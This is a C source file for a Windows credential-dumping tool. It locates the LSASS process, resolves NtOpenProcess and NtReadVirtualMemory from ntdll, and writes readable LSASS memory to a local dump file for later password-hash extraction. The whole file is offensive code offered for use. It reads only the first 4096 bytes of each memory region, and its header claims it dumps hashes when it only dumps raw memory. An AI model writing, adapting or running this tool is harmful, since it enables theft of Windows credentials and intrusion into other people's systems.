/*
* Author: Aleksa Zatezalo
* Date: Februrary 2024
* Description: LSASS is a C program that dumps password hashes from LSASSs. 
*/

/* gcc lsass_dump.c -o lsass_dump.exe -lDbghelp */

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <TlHelp32.h>

#pragma comment(lib, "ntdll.lib") // Link with ntdll.lib

typedef LONG NTSTATUS;
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) \
    {                                            \
        (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
        (p)->RootDirectory = r;                  \
        (p)->Attributes = a;                     \
        (p)->ObjectName = n;                     \
        (p)->SecurityDescriptor = s;             \
        (p)->SecurityQualityOfService = NULL;    \
    }

typedef NTSTATUS(NTAPI* pNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
);

typedef NTSTATUS(NTAPI* pNtReadVirtualMemory)(
    HANDLE ProcessHandle,
    LPCVOID BaseAddress,
    LPVOID Buffer,
    SIZE_T BufferSize,
    SIZE_T* NumberOfBytesRead
);

#define READ_SIZE 4096
#define DUMP_FILE "lsass_dump.bin"

// Function to get LSASS process ID
DWORD GetLsassPID() {
    HANDLE snapshot;
    PROCESSENTRY32 pe;
    DWORD lsassPID = 0;

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to create process snapshot. Error: %lu\n", GetLastError());
        return 0;
    }

    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(snapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "lsass.exe") == 0) {
                lsassPID = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &pe));
    }

    CloseHandle(snapshot);
    return lsassPID;
}

// Function to dump LSASS memory using direct NT syscalls
void DumpLsassMemory() {
    DWORD lsassPID = GetLsassPID();
    if (lsassPID == 0) {
        printf("[!] Could not find LSASS process.\n");
        return;
    }
    printf("[+] LSASS PID: %lu\n", lsassPID);

    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        printf("[!] Failed to load ntdll.dll\n");
        return;
    }

    pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
    pNtReadVirtualMemory NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");

    if (!NtOpenProcess || !NtReadVirtualMemory) {
        printf("[!] Failed to resolve NtOpenProcess or NtReadVirtualMemory\n");
        return;
    }

    HANDLE lsassProcess = NULL;
    CLIENT_ID clientId;
    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)lsassPID;
    clientId.UniqueThread = 0;

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = NtOpenProcess(&lsassProcess, PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &objAttr, &clientId);
    if (status != 0) {
        printf("[!] NtOpenProcess failed! Status: 0x%X\n", status);
        return;
    }
    printf("[+] Opened LSASS process successfully using NtOpenProcess.\n");

    FILE *dumpFile = fopen(DUMP_FILE, "wb");
    if (!dumpFile) {
        printf("[!] Could not create dump file.\n");
        CloseHandle(lsassProcess);
        return;
    }
    printf("[+] Created dump file: %s\n", DUMP_FILE);

    MEMORY_BASIC_INFORMATION mbi;
    BYTE buffer[READ_SIZE];
    SIZE_T bytesRead;
    LPVOID addr = 0;

    while (VirtualQueryEx(lsassProcess, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE)) {
            status = NtReadVirtualMemory(lsassProcess, mbi.BaseAddress, buffer, READ_SIZE, &bytesRead);
            if (status == 0) {
                fwrite(buffer, 1, bytesRead, dumpFile);
            }
        }
        addr = (LPBYTE)mbi.BaseAddress + mbi.RegionSize;
    }

    fclose(dumpFile);
    CloseHandle(lsassProcess);
    printf("[+] LSASS memory dumped successfully!\n");
}

int main() {
    printf("[*] Starting LSASS memory dump...\n");
    DumpLsassMemory();
    return 0;
}